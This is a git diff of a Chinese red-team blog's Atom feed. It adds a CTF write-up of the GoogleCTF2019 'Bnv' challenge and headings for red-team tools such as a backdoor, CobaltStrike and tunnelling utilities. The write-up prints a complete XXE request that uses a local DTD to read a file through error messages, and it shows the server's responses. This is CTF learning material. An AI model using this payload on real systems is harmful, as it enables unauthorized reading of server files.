@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://RedTeamToday.github.io</id>
     <title>猴子</title>
-    <updated>2020-11-20T11:12:32.256Z</updated>
+    <updated>2020-11-20T17:01:35.636Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://RedTeamToday.github.io"/>
     <link rel="self" href="https://RedTeamToday.github.io/atom.xml"/>
@@ -12,6 +12,77 @@
     <icon>https://RedTeamToday.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, 猴子</rights>
     <entry>
+        <title type="html"><![CDATA[CTF Game Today]]></title>
+        <id>https://RedTeamToday.github.io/post/ctf-game-today/</id>
+        <link href="https://RedTeamToday.github.io/post/ctf-game-today/">
+        </link>
+        <updated>2020-11-20T16:24:59.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>每天一道CTF Game，争取吧！</p>
+</blockquote>
+<h1 id="day1-googlectf2019-qualsbnv">Day1 [GoogleCTF2019 Quals]Bnv</h1>
+<ul>
+<li>通过JSON 格式传输 也可能存在 XXE漏洞</li>
+<li>本地DTD文件利用实现回显文件读取</li>
+</ul>
+<p>先贴利用的请求包，注意content-type 是从 json 改为了 xml，这是所有类型xxe漏洞利用的第一步。</p>
+<pre><code>POST /api/search HTTP/1.1
+Host: 911fd6fa-4729-4ba6-965a-cfe749698f19.node3.buuoj.cn
+Content-Length: 340
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 Edg/84.0.522.63
+Content-type: application/xml
+Accept: */*
+Origin: http://911fd6fa-4729-4ba6-965a-cfe749698f19.node3.buuoj.cn
+Referer: http://911fd6fa-4729-4ba6-965a-cfe749698f19.node3.buuoj.cn/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Cookie: UM_distinctid=175e67f63ec3dc-07bb01a5c02175-7c690e53-13c680-175e67f63edb2a
+Connection: close
+
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message[
+    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
+    &lt;!ENTITY % ISOamso '
+&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;
+&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+&amp;#x25;eval;
+&amp;#x25;error;
+'&gt;
+%local_dtd;
+]&gt;
+</code></pre>
+<p>思路过程：<br>
+将Content-Type 改为 <code>application/xml</code> 发送请求包，返回：</p>
+<pre><code>HTTP/1.1 200 OK
+Server: openresty
+Date: Fri, 20 Nov 2020 16:44:30 GMT
+Content-Type: text/xml; charset=utf-8
+Content-Length: 51
+Connection: close
+
+Start tag expected, '&lt;' not found, line 1, column 1
+</code></pre>
+<p>说明后端是可以解析xml，那么可以试试xxe格式，发起请求。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;message&gt;1234010123502402340&lt;/message&gt;
+
+</code></pre>
+<p>返回</p>
+<pre><code>HTTP/1.1 200 OK
+Server: openresty
+Date: Fri, 20 Nov 2020 16:58:28 GMT
+Content-Type: text/xml; charset=utf-8
+Content-Length: 51
+Connection: close
+
+Validation failed: no DTD found !, line 2, column 9
+</code></pre>
+<p>找不到 DTD实体<br>
+先睡觉了，明天打比赛呢！⛽️</p>
+<p>参考：https://www.yuque.com/u390550/hsy6gq/ksmfiw</p>
+]]></content>
+    </entry>
+    <entry>
         <title type="html"><![CDATA[RedTeam Papers]]></title>
         <id>https://RedTeamToday.github.io/post/redteam-papers/</id>
         <link href="https://RedTeamToday.github.io/post/redteam-papers/">
@@ -19,6 +90,9 @@
         <updated>2020-11-20T07:03:40.000Z</updated>
         <content type="html"><![CDATA[<p>整理些文章链接。</p>
 <p>2020年11月：</p>
+<ul>
+<li>https://xz.aliyun.com/t/6349 内网渗透之端口转发、映射、代理</li>
+</ul>
 ]]></content>
     </entry>
     <entry>
@@ -27,13 +101,14 @@
         <link href="https://RedTeamToday.github.io/post/RedTeamtools/">
         </link>
         <updated>2020-11-20T04:49:20.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="backdoor">Backdoor</h1>
-<figure data-type="image" tabindex="1"><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201108134100.jpg" alt="" loading="lazy"></figure>
+        <content type="html"><![CDATA[<!-- more -->
+<h1 id="backdoor">Backdoor</h1>
 <h2 id="tsh">tsh</h2>
 <h1 id="c2-远控">C2 远控</h1>
 <h2 id="cobaltstrike">CobaltStrike</h2>
-<h1 id="内网穿透">内网穿透</h1>
+<h1 id="内网穿透端口转发-映射-代理">内网穿透（端口转发、映射、代理</h1>
 <h2 id="ew">ew</h2>
+<h2 id="icx">icx</h2>
 <h2 id="proxychains">proxychains</h2>
 <h2 id="reg">reg</h2>
 ]]></content>
